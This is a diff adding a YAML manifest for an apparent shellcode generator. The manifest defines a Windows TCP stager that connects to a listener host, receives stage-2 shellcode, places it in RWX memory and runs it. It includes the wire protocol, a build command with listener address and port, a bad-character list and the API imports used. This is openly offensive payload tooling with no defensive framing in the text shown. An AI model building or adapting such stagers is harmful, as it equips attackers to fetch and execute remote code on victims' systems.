@@ -1,0 +1,20 @@
+template: ir_tcp_stager
+# IR workflow: TCP stager (stage 1 of multi-stage chain).
+# Downloads stage 2 shellcode into RWX memory and transfers control.
+#
+# Protocol: [4 bytes LE size][raw stage-2 shellcode bytes]
+#
+# Build:
+#   uv run emitrion emitrion/manifests/ir_tcp_stager.yaml \
+#       --lhost 192.168.1.100 --lport 9001 \
+#       --no-assemble --out emitter_out/
+badchars: ["00", "0a", "0d"]
+
+functions:
+  - LoadLibraryA
+  - WSAStartup
+  - WSASocketA
+  - connect
+  - recv
+  - closesocket
+  - VirtualAlloc
